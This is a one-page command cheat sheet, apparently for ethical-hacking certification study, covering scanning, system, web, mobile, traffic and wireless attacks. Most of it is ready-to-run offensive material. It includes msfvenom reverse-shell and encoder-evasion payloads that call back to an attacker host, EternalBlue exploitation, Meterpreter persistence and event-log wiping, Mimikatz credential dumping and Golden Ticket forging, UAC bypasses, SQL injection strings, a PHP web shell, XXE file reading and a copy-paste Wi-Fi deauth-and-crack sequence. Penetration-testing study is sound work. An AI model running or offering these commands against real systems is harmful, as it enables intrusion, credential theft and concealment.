---
layout: default
title: Command Index
nav_order: 2
description: "Every command across all 7 domains on one searchable page. Ctrl+F to find, click to copy."
---

# Command Index

Every command, one page. Ctrl+F to search, click any block to copy.

---

## Domain 1: Network Scanning

### Nmap — Host Discovery

```bash
nmap -sn 192.168.1.0/24              # Ping scan (find live hosts)
nmap -sP 10.10.55.0/24               # ARP ping (local network)
nmap -sS -P 10.10.55.0/24            # TCP SYN ping (ICMP blocked)
nmap -sU -P 10.10.55.0/24            # UDP ping
```

### Nmap — Port Scanning

```bash
nmap -sT -v 192.168.1.5              # TCP connect scan (full handshake)
nmap -sS -v 192.168.1.5              # TCP SYN scan (stealthy, half-open)
nmap -sU -v 192.168.1.5              # UDP scan
nmap -p 22,80,443 192.168.1.5        # Specific ports (NO spaces in list)
nmap -p 1-1000 192.168.1.5           # Port range
nmap -p- 192.168.1.5                 # All 65535 ports
nmap -F 192.168.1.5                  # Fast scan (top 100)
nmap -A -T4 192.168.1.5              # Aggressive (OS + version + scripts)
nmap --open 192.168.1.5              # Show only open ports
```

### Nmap — Version / OS / Scripts

```bash
nmap -sV 192.168.1.5                 # Service version detection
nmap -O 192.168.1.5                  # OS detection
nmap -sC 192.168.1.5                 # Default script scan
nmap -A -T4 -p- 192.168.1.5          # Comprehensive (gold-standard recon)
```

### Nmap — SMB Scripts

```bash
nmap --script smb-os-discovery.nse -p445 192.168.1.5   # OS/domain/workgroup
nmap --script smb-enum-users.nse -p445 192.168.1.5     # Enumerate users
nmap -p445 --script=smb-enum-shares.nse 192.168.1.5    # Enumerate shares
```

### Nmap — SNMP

```bash
nmap -sU -p 161 --script snmp-processes.nse 192.168.1.5   # SNMP running processes
```

### Nmap — Active Directory / Domain Controller

```bash
nmap -p 88,389,636,3268 192.168.0.0/24         # Find DC (Kerberos/LDAP/GC ports)
nmap -sC 192.168.0.X --top-ports=20            # NetBIOS name + FQDN
nmap -p 389 --script ldap-rootdse 192.168.0.X  # Domain naming context / FQDN
nmap -p 88 --script krb5-enum-users 192.168.0.X # Kerberos realm
nmap -sU -p 137 --script nbstat 192.168.0.X    # NetBIOS name table
```

### Nmap — Vuln Check (EternalBlue)

```bash
nmap -p445 --script smb-vuln-ms17-010 192.168.1.5   # Confirm MS17-010 vulnerable
```

### netdiscover

```bash
netdiscover -i eth0 -r 192.168.1.0/24   # ARP-based host discovery
```

### smbclient / smbget

```bash
smbclient -L 192.168.1.5                        # List shares
smbclient //192.168.1.5/Documents               # Access share
smbclient //192.168.1.5/Documents -U admin%password123  # Access with creds
smbclient -L 192.168.1.5 -U admin%password123   # List shares with creds
smbget -R smb://192.168.1.5/Documents           # Recursively download share
```

### enum4linux

```bash
enum4linux -a 192.168.1.5                        # All info
enum4linux -U 192.168.1.5                        # Users only
enum4linux -S 192.168.1.5                        # Shares only
enum4linux -G 192.168.1.5                        # Groups
enum4linux -P 192.168.1.5                        # Password policy
enum4linux -u admin -p password123 -a 192.168.1.5 # With credentials
```

### snmp-check / onesixtyone

```bash
snmp-check 192.168.1.5                # SNMP enumeration
onesixtyone 192.168.1.0/24            # SNMP host discovery
# Common community strings: public (RO), private (RW), community, manager
```

### DNS — nslookup / dig

```bash
nslookup target.com                       # Basic DNS lookup
nslookup 192.168.1.5                      # Reverse lookup (IP → hostname)
dig target.com                            # Detailed DNS lookup
dig target.com ANY                        # All records
dig @ns1.target.com target.com axfr       # Zone transfer (dumps all records if misconfigured)
```

---

## Domain 2: System Hacking

### Hydra — Brute Force

```bash
hydra -l Administrator -P rockyou.txt rdp://192.168.1.50   # RDP, single user
hydra -l admin -P password_list.txt rdp://192.168.1.50:3389 # RDP on custom port
hydra -L usernames.txt -P passwords.txt rdp://192.168.1.5  # Multiple usernames
hydra -l admin -P passwords.txt rdp://192.168.1.5 -v       # Verbose
hydra -l admin -P passwords.txt rdp://192.168.1.5 -f       # Stop after first hit
hydra -l root -P rockyou.txt ssh://192.168.1.5             # SSH
hydra -l admin -P rockyou.txt ftp://192.168.1.5            # FTP
hydra -l root -P rockyou.txt mysql://192.168.1.5:3306      # MySQL
hydra -l admin -P rockyou.txt http-post-form://192.168.1.5:80/login.php:username=^USER^&password=^PASS^  # HTTP POST form
```

### Hash Cracking — hashid / hashcat / john

```bash
hashid hash_value                         # Identify hash type
hashcat -m 0 -a 0 hashfile rockyou.txt    # MD5
hashcat -m 100 -a 0 hashfile rockyou.txt  # SHA1
hashcat -m 1400 -a 0 hashfile rockyou.txt # SHA256
hashcat -m 1000 -a 0 hashfile rockyou.txt # NTLM
hashcat -m 3200 -a 0 hashfile rockyou.txt # bcrypt
hashcat -m 0 hashfile rockyou.txt --show  # Show cracked
john hashes.txt --wordlist=rockyou.txt    # John, auto-detect
john --format=NT ntlm_hashes.txt --wordlist=rockyou.txt  # John, NTLM
john --show hashes.txt                    # Show cracked
john --incremental hashes.txt             # Brute-force mode
```

### msfvenom — Payload Generation

```bash
# Windows reverse shell (EXE)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > backdoor.exe
# Linux reverse shell (ELF)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > linux_shell
# Windows batch
msfvenom -p windows/cmd/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f bat > shell.bat
# DLL payload (service DLL hijack)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll > evil.dll
# With encoder (AV evasion, 5 iterations)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > obfuscated.exe
```

### msfconsole — Handler & Exploits

```bash
msfconsole
use exploit/multi/handler                 # Listener for reverse shell
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
# Exploit search
search type:exploit platform:windows smb
search type:exploit eternalblue
# EternalBlue (MS17-010) → lands as NT AUTHORITY\SYSTEM
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
run
# Other common exploits
use exploit/linux/samba/is_known_pipename
use exploit/ssh/libssh_auth_bypass
show options       # View settings
show targets       # View targets
show payloads      # List payloads
check              # Test if target vulnerable
exploit            # Run exploit
```

### Meterpreter — Session & Recon

```bash
sessions -l                 # List sessions
sessions -i 1               # Interact with session 1
background                  # Background current session
jobs -l                     # List jobs
getuid                      # Current user
sysinfo                     # System info
ipconfig                    # Network config
ps                          # List processes
kill PID                    # Kill process
pwd                         # Current directory
ls                          # List files
download file.txt /tmp/     # Download file
upload /tmp/evil.exe c:\windows\temp\  # Upload file
execute -f cmd.exe -i       # Interactive shell
reg query HKLM\\Software\\Microsoft\\Windows\\Run   # Query registry
```

### Meterpreter — Core Post-Exploitation Path

```bash
getuid                      # Who am I?
getsystem                   # Auto-escalate to SYSTEM
hashdump                    # Dump SAM (NTLM hashes) — needs SYSTEM
run persistence -X -i 30 -p 4444 -r 192.168.1.100   # Persistence backdoor
clearev                     # Wipe Windows event logs
# If getsystem fails:
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

### Meterpreter — Post Modules & Kiwi (Mimikatz)

```bash
use post/windows/gather/hashdump
use post/windows/escalate/getsystem
use post/windows/gather/credentials/credential_collector
use post/windows/manage/enable_rdp
# Kiwi (in-session Mimikatz)
load kiwi
creds_all                   # All cached creds
lsa_dump_sam                # SAM hashes
lsa_dump_secrets            # LSA secrets
```

### Mimikatz — Credential Harvesting

```bash
mimikatz.exe
privilege::debug            # Enable debug privileges (required)
lsadump::sam               # Dump SAM hashes (local accounts)
lsadump::lsa /inject       # Dump LSA secrets
lsadump::lsa /patch
sekurlsa::logonpasswords   # Dump plaintext logon passwords
token::list                # List tokens
token::impersonate /user:DOMAIN\Administrator  # Impersonate token
kerberos::list             # List Kerberos tickets
kerberos::ptt /ticket:ticket.kirbi             # Pass-the-Ticket
lsadump::dcsync /user:DOMAIN\Administrator      # DCSync (needs high priv)
lsadump::dcsync /user:DOMAIN\krbtgt             # Get krbtgt hash for Golden Ticket
# Golden Ticket
token::elevate
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /krbtgt:hash /ptt
# Silver Ticket (service-specific)
kerberos::silver /user:Administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /service:CIFS /server:DC01 /rc4:SERVICE_HASH /ptt
```

### Windows Privilege Escalation

```bash
# Unquoted service paths
wmic service list brief | findstr /i "auto"
Get-WmiObject win32_service | Select Name,PathName | Where {$_.PathName -notlike '"*' -and $_.PathName -notlike "C:\Windows*"}
shutdown /r /t 0                          # Reboot to trigger
# Weak service DACL
accesschk.exe -uwcqv "Authenticated Users" "C:\Program Files\*"
sc qc ServiceName                         # Query service config
sc config VulnerableService binPath= "C:\path\to\malware.exe"  # Hijack binary
net stop VulnerableService && net start VulnerableService
# UAC bypass — FodHelper (Win 10+)
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d ""
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\path\to\malware.exe" /f
fodhelper.exe
# UAC bypass — EventViewer
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "C:\path\to\malware.exe" /f
eventvwr.exe
# Kernel exploit recon
systeminfo
wmic qfe list brief | find "KB"           # Common: MS16-032, MS17-010, CVE-2019-1385
```

### Windows Persistence

```bash
# Registry run keys
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "UpdateService" /t REG_SZ /d "C:\windows\temp\malware.exe"
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "Service" /t REG_SZ /d "C:\windows\temp\malware.exe"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "UserApp" /t REG_SZ /d "C:\users\username\appdata\malware.exe"
# Scheduled tasks
schtasks /create /tn "SystemUpdate" /tr "C:\path\to\malware.exe" /sc onlogon /ru System
schtasks /create /tn "Windows Maintenance" /tr "C:\windows\temp\payload.exe" /sc hourly
schtasks /create /tn "Service" /tr "C:\malware.exe" /sc onstart /ru System
schtasks /query /tn "SystemUpdate"
schtasks /delete /tn "SystemUpdate" /f
# Service install (SYSTEM)
sc create "UpdateService" binPath= "C:\windows\temp\malware.exe"
sc config "UpdateService" start= auto
net start "UpdateService"
sc delete "UpdateService"
# Startup folder
copy malware.exe "C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
copy malware.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### SMB — Weak Credential Access (in smbclient)

```bash
smbclient //192.168.1.5/Documents -U admin%password123
ls              # List directory
get secret.txt  # Download file
recurse ON      # Recursive mode
mget *          # Download all
```

---

## Domain 3: Web Hacking

### SQL Injection — Auth Bypass Payloads

```sql
admin' --
admin'--
admin' #
admin'/*
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
' OR 1=1#
') OR ('1'='1
" OR "1"="1
```

### SQL Injection — Detection & UNION

```sql
-- Detect: break it, then boolean test
?id=1'                                   -- error/blank = injectable
?id=1 AND 1=1                            -- loads normal
?id=1 AND 1=2                            -- breaks/empty
-- UNION-based
?id=1 ORDER BY 1--                       -- increase until error = column count
?id=-1 UNION SELECT 1,2,3--              -- find echoed columns
?id=-1 UNION SELECT 1,version(),database()--
?id=-1 UNION SELECT 1,table_name,3 FROM information_schema.tables--
?id=-1 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
?id=-1 UNION SELECT 1,concat(username,':',password),3 FROM users--
```

### SQL Injection — Error / Blind / Time-Based

```sql
-- Error-based (MySQL)
?id=1 AND extractvalue(1,concat(0x7e,(SELECT database())))--
?id=1 AND updatexml(1,concat(0x7e,(SELECT user())),1)--
-- Boolean-blind
?id=1 AND SUBSTRING(database(),1,1)='a'--
?id=1 AND (SELECT LENGTH(database()))=4--
-- Time-based
?id=1 AND SLEEP(5)--                                        -- MySQL
?id=1 AND IF(SUBSTRING(database(),1,1)='d',SLEEP(5),0)--    -- MySQL leak
?id=1 AND IF(1=1,BENCHMARK(5000000,MD5('a')),0)--           -- MySQL alt
?id=1; SELECT pg_sleep(5)--                                 -- PostgreSQL
?id=1; WAITFOR DELAY '0:0:5'--                              -- MSSQL
?id=1 AND 1=(dbms_pipe.receive_message('a',5))--            -- Oracle
```

### sqlmap — Automation

```bash
sqlmap -u "http://192.168.1.5/page.php?id=1" --dbs                     # GET param
sqlmap -u "http://192.168.1.5/login.php" --data "user=admin&pass=test" --dbs  # POST
sqlmap -r request.txt --dbs                                            # From Burp request
sqlmap -u "http://192.168.1.5/page.php?id=1" --cookie="PHPSESSID=abc123" --dbs # With cookie
sqlmap -u "http://192.168.1.5/page.php?id=1" -D database_name --tables # List tables
sqlmap -u "http://192.168.1.5/page.php?id=1" -D database_name -T users --dump  # Dump table
sqlmap -u "http://192.168.1.5/page.php?id=1" --current-db --dump --batch       # Fast DB+creds
sqlmap -u "http://192.168.1.5/page.php?id=1" --technique=T --dbms=mysql # Force time-based
sqlmap -u "http://192.168.1.5/page.php?id=1" --level=5 --risk=3         # Dig harder
sqlmap -u "http://192.168.1.5/page.php?id=1" --file-read="/etc/passwd"  # Read file
sqlmap -u "http://192.168.1.5/page.php?id=1" --os-shell                 # OS shell
# Flags: --batch (no prompts), -p id (one param), --threads 5, --tamper=space2comment, --dump-all
```

### Nikto — Web Scanner

```bash
nikto -h http://192.168.1.5                 # Scan web server
nikto -h 192.168.1.5 -p 8080                # Non-standard port
nikto -h http://192.168.1.5 -o report.txt   # Save report
```

### Robuster — Directory Brute Force

```bash
robuster dir -u http://192.168.1.5 -w /usr/share/wordlists/dirb/common.txt   # Built-in wordlist
robuster dir -u http://192.168.1.5 -w wordlist.txt                           # Custom wordlist
```

### WPScan — WordPress

```bash
wpscan --url http://target.com --enumerate u              # Usernames
wpscan --url http://target.com --enumerate p              # Plugins
wpscan --url http://target.com --enumerate t              # Themes
wpscan --url http://target.com --enumerate all            # Everything
wpscan --url http://target.com -U admin -P rockyou.txt    # Brute-force login
```

### curl — HTTP Requests

```bash
curl http://target.com                                     # Basic request
curl -u user:pass http://target.com                        # Basic auth
curl -X POST -d "user=admin&pass=test" http://target.com   # POST data
curl -b "session=12345" http://target.com                  # With cookie
curl -H "Authorization: Bearer token" http://target.com    # Custom header
```

### Burp Suite — Workflow (GUI)

```
Proxy setup: Proxy tab → Intercept ON → browser proxy 127.0.0.1:8080
Intercept:   Browse → submit → request pauses → edit params → Forward
Repeater:    Right-click request → Send to Repeater → modify → Send
Tampering targets: price=100→1, user_id=5→1, discount=0→99, is_admin=false→true
```

### File Upload Bypass Payloads

```
# Extension manipulation
shell.php.jpg      shell.php%20      shell.php%00.jpg
shell.phtml        shell.php3        shell.php4       shell.php~
# Double extension
shell.php.jpg   shell.jpg.php   shell.php.txt
# Case variation
shell.PhP   shell.pHp   shell.PHP
# MIME manipulation: change Content-Type to image/jpeg with PHP bytes
# Magic bytes: prepend JPEG header FF D8 FF to PHP shell
```

```php
<?php system($_GET['cmd']); ?>
```

### XXE Injection

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

---

## Domain 4: Cryptography & Steganography

### hashid — Hash Identification

```bash
hashid hash_value       # Guess hash type
hashid -e hash_value    # Also show matching Hashcat mode
```

### hashcat / john — Hash Cracking

```bash
hashcat -m 0 -a 0 hashfile rockyou.txt      # MD5 (len 32)
hashcat -m 100 -a 0 hashfile rockyou.txt    # SHA1 (len 40)
hashcat -m 1400 -a 0 hashfile rockyou.txt   # SHA256 (len 64)
hashcat -m 1000 -a 0 hashfile rockyou.txt   # NTLM (len 32)
hashcat -m 3200 -a 0 hashfile rockyou.txt   # bcrypt (len 60)
john hashes.txt --wordlist=rockyou.txt      # John wordlist
john --format=md5 hashes.txt --wordlist=rockyou.txt  # John, specify format
john --show hashes.txt                      # Show cracked
```

### steghide / stegcracker — Steganography

```bash
steghide info image.jpg                              # Check for hidden data
steghide extract -sf image.jpg                       # Extract (prompts passphrase)
steghide extract -sf image.jpg -p ""                 # Extract, no passphrase
steghide extract -sf image.jpg -xf output.txt -p ""  # Extract to file
stegcracker image.jpg wordlist.txt                   # Crack passphrase
```

### PE File Analysis — DIE / strings / objdump / exiftool

```bash
DIE filename.exe                            # Detect It Easy (GUI)
detect-it-easy filename.exe                 # DIE command line
strings Ghostware.exe | grep -i version     # Readable strings → version
strings Ghostware.exe | grep -E "(http|ftp|cmd|exec)"  # URLs/commands
objdump -h Ghostware.exe                     # Section headers
objdump -x Ghostware.exe | grep -A 20 "Import"  # Import table
objdump -s -j .rsrc executable.exe           # Resources
exiftool Ghostware.exe                       # Metadata
exiftool Ghostware.exe | grep -i version     # Version from metadata
# CFF Explorer (GUI): PE headers, imports/exports, .rsrc → Version Information
```

### VeraCrypt — Encrypted Volumes

```bash
veracrypt --mount /dev/sdb1 /mnt/encrypted --password=PASSWORD   # Mount device
veracrypt --mount volume.hc /mnt/encrypted --password=test       # Mount container
# GUI: Select File → pick slot → Mount → enter password → count files inside → Dismount
```

### File / Text Decryption (CEH Lab GUI)

```bash
aescrypt -d -p qwerty secret.aes     # AES Tool CLI equivalent (.aes file, pw qwerty)
# BCTextEncoder (GUI): paste encoded → Decode → password Pa$$w0rd → plaintext (e.g. IP)
# CrypTool (GUI): open .hex → Crypt/Decrypt → Symmetric → match algorithm (e.g. Twofish)
```

---

## Domain 5: Mobile & IoT

### ADB — Device Connection

```bash
adb devices                          # List devices
adb devices -l                       # With details
adb tcpip 5555                       # Enable Wi-Fi debugging
adb connect 192.168.1.100:5555       # Connect over Wi-Fi
adb disconnect 192.168.1.100:5555    # Disconnect
adb reboot                           # Reboot (also: recovery, bootloader)
adb root                             # Restart adbd as root
adb shell whoami                     # Verify connection / user
```

### ADB — Shell & Recon

```bash
adb shell                                    # Open device shell
adb shell getprop ro.build.version.release   # Android version
adb shell getprop ro.product.model           # Device model
adb shell id                                 # User ID & groups
adb shell pwd                                # Current dir
adb shell ps                                 # Processes
adb shell netstat                            # Connections
adb shell ls /sdcard/                        # List sdcard
adb shell ls /sdcard/DCIM/Camera/            # Camera photos
adb shell ls -la /data/data/                 # App data folders
adb shell cat /proc/version                  # Kernel version
adb shell cat /etc/passwd                    # User accounts
```

### ADB — File Transfer & Packages

```bash
adb pull /sdcard/DCIM/Camera/image.jpg ./    # Pull file
adb pull /sdcard/DCIM/Camera/ ./photos/      # Pull directory
adb push file.apk /sdcard/                   # Push file
adb shell rm /sdcard/file.txt                # Remove file
adb install app.apk                          # Install APK
adb install -r app.apk                       # Reinstall (keep data)
adb uninstall com.example.app                # Uninstall
adb shell pm list packages                   # List packages
adb shell pm list packages -3                # User-installed only
adb shell pm path com.example.app            # Get APK path
```

### ADB — App Interaction & Logcat

```bash
adb shell am start -n com.example.app/.MainActivity   # Launch activity
adb shell dumpsys package com.example.app             # App info
adb shell dumpsys package com.example.app | grep android.permission  # Permissions
adb shell screencap /sdcard/screen.png                # Screenshot
adb pull /sdcard/screen.png ./
adb shell input text "password"                       # Type text
adb shell input tap 500 1200                          # Tap
adb shell input swipe 100 500 100 100                 # Swipe
adb shell input keyevent 3                            # HOME key
adb logcat                                            # Live logs
adb logcat | grep com.example.app                     # Filter by app
adb logcat *:E                                        # Errors only
adb logcat -c                                         # Clear logs
adb logcat | grep -iE "(password|token|secret|key|auth)"  # Hunt secrets
```

### ADB — Sensitive Data Extraction

```bash
adb pull /data/data/com.example.app/databases/app.db ./    # Pull database
adb pull /data/data/com.example.app/shared_prefs/ ./       # Shared prefs
adb pull /data/data/com.example.app/cache/ ./              # Cache
adb shell ls -la /data/data/com.example.app/               # List private storage
```

### sqlite3 — Database Analysis

```bash
sqlite3 app.db          # Open database
.tables                 # List tables
.schema users           # Show schema
SELECT * FROM users;    # Query data
.exit                   # Exit
```

### APK Static Analysis — apktool / jadx

```bash
apktool d app.apk -o app_src          # Decompile resources + manifest (Smali)
apktool b app_src/                     # Recompile
cat app_src/AndroidManifest.xml        # Permissions/components
jadx -d app_out app.apk                # Decompile DEX → Java
jadx-gui app.apk                       # GUI decompiler
aapt dump badging app.apk              # APK metadata
grep -riE "password|api[_-]?key|secret|token|http://|https://" app_src/ app_out/  # Hunt secrets
cat app_src/res/values/strings.xml     # Keys/endpoints often here
strings app.apk | grep -iE "password|api|http|admin|secret"  # Strings from APK
```

### MQTT — mosquitto

```bash
mosquitto_sub -h 192.168.1.50 -t "#" -v                # Subscribe to ALL topics
mosquitto_sub -h 192.168.1.50 -t "home/sensors/temp"   # Specific topic
mosquitto_pub -h 192.168.1.50 -t "home/lock" -m "unlock"  # Publish command
mosquitto_sub -h 192.168.1.50 -u admin -P password -t "#" -v  # With credentials
```

### Firmware — binwalk

```bash
binwalk firmware.bin                                    # Inspect image
binwalk -e firmware.bin                                 # Extract filesystem
grep -riE "password|admin|root|key" _firmware.bin.extracted/  # Grep extracted
strings firmware.bin | grep -iE "password|http|admin"   # Readable strings
```

### IoT Discovery — Shodan filters

```
port:1883                    # Exposed MQTT brokers
product:"MQTT"               # MQTT by banner
"default password" port:23   # Telnet devices with defaults
webcam city:"London"         # Exposed webcams
# Default creds to try: admin:admin, root:root, admin:password
```

### exiftool — Image Metadata

```bash
exiftool image.jpg                          # All metadata
exiftool image.jpg | grep -i "gps\|date"    # GPS / timestamps
```

---

## Domain 6: Traffic Analysis

### Wireshark — Display Filters

```
http                                       # HTTP only
https or tls                               # HTTPS
ip.src == 192.168.1.5                       # Source IP
ip.dst == 10.0.0.1                          # Destination IP
ip.addr == 192.168.1.5                      # Either src or dst
tcp.port == 80                              # TCP port
udp.port == 53                              # UDP port
tcp.flags.syn == 1 && tcp.flags.ack == 0    # SYN-only (scan/flood)
tcp contains "admin"                        # TCP payload string
frame contains "password"                   # Whole-frame string
mqtt / ftp / dns / icmp / telnet            # Protocol filters
# Combine with && (and), || (or), ! (not)
```

### Wireshark — Credentials Workflow

```
http.request.method == "POST"          # Login attempts (creds in body)
http.authbasic                         # HTTP Basic Auth (base64 user:pass)
ftp.request.command == "USER" || ftp.request.command == "PASS"  # FTP login
telnet                                 # Telnet cleartext
tcp.port == 3306                       # MySQL
# Then: Right-click → Follow → TCP Stream to read the conversation
# Basic Auth decode: echo dXNlcjpwYXNz | base64 -d
```

### Wireshark — Follow / Export / Stats

```
Right-click packet → Follow → TCP/UDP/HTTP Stream   # Read full conversation
File → Export Objects → HTTP                         # Pull transferred files
Statistics → Protocol Hierarchy                      # Protocols in capture
Statistics → Conversations                           # Who talked to who
Statistics → Endpoints                               # Per-IP totals (find attacker)
Statistics → I/O Graph                               # Traffic spikes (attack window)
```

### Wireshark — DDoS / Flood Signatures

```
tcp.flags.syn==1 && tcp.flags.ack==0    # SYN flood
tcp.flags.ack==1 && tcp.flags.syn==0    # ACK flood
icmp                                    # ICMP/ping flood
udp                                     # UDP flood
dns && udp.length > 300                 # DNS amplification
http.request                            # HTTP flood (L7)
# Many source IPs → DDoS. One source IP → DoS.
```

### Wireshark — TTL / OS Fingerprint

```
ip.ttl == 128    # Windows (default TTL 128)
ip.ttl == 64     # Linux/macOS (default TTL 64)
# Cisco default TTL 255. Round observed TTL UP to nearest default; each hop = -1.
```

### Wireshark — MQTT / RAT Detection

```
mqtt                          # All MQTT
mqtt.msgtype == 1             # CONNECT (creds: mqtt.username / mqtt.passwd)
mqtt.msgtype == 3             # PUBLISH (actual data)
mqtt.topic contains "temp"    # Topic search
tcp.port == 4444              # Common Metasploit/reverse-shell port
ip.dst == 203.0.113.66        # Suspected C2 IP (see beacons)
tcp.flags.push == 1 && tcp.len > 0   # Interactive shell data
# MQTT ports: 1883 (plain), 8883 (TLS), 9001 (WebSockets)
```

### tcpdump

```bash
tcpdump -D                                    # List interfaces
tcpdump -i eth0                               # Capture on interface
tcpdump -i eth0 -w capture.pcap               # Save to file
tcpdump -i eth0 -c 100 -w output.pcap         # Capture 100 packets
tcpdump -i eth0 tcp                           # TCP only
tcpdump -i eth0 udp                           # UDP only
tcpdump -i eth0 src 192.168.1.5               # Source IP
tcpdump -i eth0 dst 10.0.0.0/8                # Destination net
tcpdump -i eth0 port 80                       # Port
tcpdump -i eth0 dst port 443                  # Destination port
tcpdump -i eth0 portrange 1000-2000           # Port range
tcpdump -i eth0 "tcp port 80 or tcp port 443" # Complex filter
tcpdump -i eth0 -X "tcp port 21"              # Hex + ASCII (find passwords)
tcpdump -i eth0 -A "tcp port 80"              # ASCII only
tcpdump -r capture.pcap                       # Read file
tcpdump -r capture.pcap "tcp port 80"         # Filter a file
tcpdump -r capture.pcap -w filtered.pcap "tcp and port 443"  # Extract to new file
tcpdump -r capture.pcap -A | grep -i password # Grep cleartext creds
tcpdump -i eth0 "src 192.168.1.50 and dst not 192.168.0.0/16" -vv  # RAT beaconing out
```

### tshark

```bash
tshark -r capture.pcapng                                    # Read file
tshark -r capture.pcapng -Y "http"                          # Apply filter
tshark -r capture.pcapng -V                                 # Verbose
tshark -r capture.pcapng -T fields -e ip.src -e ip.dst      # Extract IPs
tshark -r capture.pcapng -Y "http.request" -T fields -e http.method -e http.host -e http.request.uri  # HTTP
tshark -r capture.pcapng -Y "ftp.request.command == 'USER' or ftp.request.command == 'PASS'" -T fields -e ftp.request.command -e ftp.request.arg  # FTP creds
tshark -r capture.pcapng -Y "dns.qry.name" -T fields -e dns.qry.name  # DNS queries
tshark -r capture.pcapng -Y "mqtt.msgtype == 3" -T fields -e mqtt.topic -e mqtt.msg  # MQTT
tshark -r capture.pcapng -T json > output.json              # JSON out
tshark -r capture.pcapng -T csv > output.csv                # CSV out
tshark -r capture.pcapng -q -z endpoints,tcp               # Endpoint stats
tshark -r capture.pcapng -q -z ip_hosts,tree               # IP stats
```

---

## Domain 7: Wireless

### airmon-ng — Monitor Mode

```bash
sudo airmon-ng check kill              # Kill interfering processes
sudo airmon-ng start wlan0             # Enable monitor mode → wlan0mon
sudo airmon-ng start wlan0 6           # Start on specific channel
sudo airmon-ng stop wlan0mon           # Disable monitor mode
iwconfig wlan0mon                      # Verify "Mode:Monitor"
iwlist wlan0mon channel                # List channels
```

### airodump-ng — Scan & Capture

```bash
sudo airodump-ng wlan0mon                                    # Scan all networks
sudo airodump-ng --essid "TargetNetwork" wlan0mon            # Targeted scan
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon  # Capture handshake
# Watch for "WPA handshake: AA:BB:CC:DD:EE:FF" in upper right
# Columns: BSSID (router MAC), PWR (signal), CH (channel), ESSID (network name)
```

### aireplay-ng — Deauthentication

```bash
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon   # Deauth all clients
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon  # Deauth specific client
sudo aireplay-ng --deauth 50 -a TARGET_BSSID wlan0mon        # More packets if no handshake
sudo aireplay-ng -3 -b TARGET_BSSID -h MAC_ADDRESS wlan0mon  # WEP ARP injection (legacy)
```

### aircrack-ng — Verify & Crack

```bash
aircrack-ng Credmapwifi.cap                                  # List networks in capture
aircrack-ng capture-01.cap                                   # Verify handshake present
aircrack-ng -J capture.json capture-01.cap                   # Convert to JSON / verify
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap  # Crack (BSSID)
aircrack-ng -w wordlist.txt capture.cap                      # Crack all networks in file
aircrack-ng -w wordlist.txt -a 2 capture-01.cap              # WPA2 mode
# Success: KEY FOUND! [ PASSWORD_HERE ]
```

### Handshake Verification (alternatives)

```bash
tshark -r capture-01.cap -Y "eapol" | head -20   # Show EAPOL (4-way handshake) frames
cowpatty -r capture-01.cap -c                    # "Passphrase not in dictionary" = valid handshake
```

### hashcat — WPA2 Mask Attack

```bash
hashcat -m 22000 capture.hc22000 -a 3 ?l?l?l?l?d?d?d?d   # 4 lowercase + 4 digits
hashcat -m 22000 capture.hc22000 -a 3 ?u?l?l?l?l?l?l?l   # Capital + 7 lowercase
# ?u=upper ?l=lower ?d=digit ?s=special
```

### Wordlist Generation — crunch

```bash
crunch 8 8 0123456789 > numbers.txt          # All 8-digit numbers
crunch 8 8 -t @@@@@@@? -o words.txt           # Pattern-based
cat list1.txt list2.txt > combined.txt        # Combine lists
sort combined.txt | uniq > deduped.txt        # Deduplicate
```

### Defensive / Automated

```bash
sudo iwlist wlan0 scan | grep -E "ESSID|Group Cipher|Pairwise"  # Show network security
sudo wifite -all -wpa                          # Automated WPA testing
# Wireshark deauth-detection filter: wlan.fc.type_subtype == 0x0c
```

### Full Attack Sequence (copy-paste)

```bash
# Terminal 1 — setup + capture
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# Terminal 2 — force handshake
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# Terminal 3 — crack after handshake confirmed
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

---

## Utility Commands

### find / grep

```bash
find / -name "*.db" 2>/dev/null            # Find all databases
find / -name "*password*" 2>/dev/null      # Files named "password"
find . -type f -newer file.txt             # Modified after a file
find . -type f -size +100M                 # Files over 100MB
grep -r "password" ./                       # Recursive search
grep -i "admin" file.txt                    # Case-insensitive
grep -E "(http|ftp|ssh)" file.txt           # Regex pattern
grep -v "^#" config.txt                     # Exclude comments
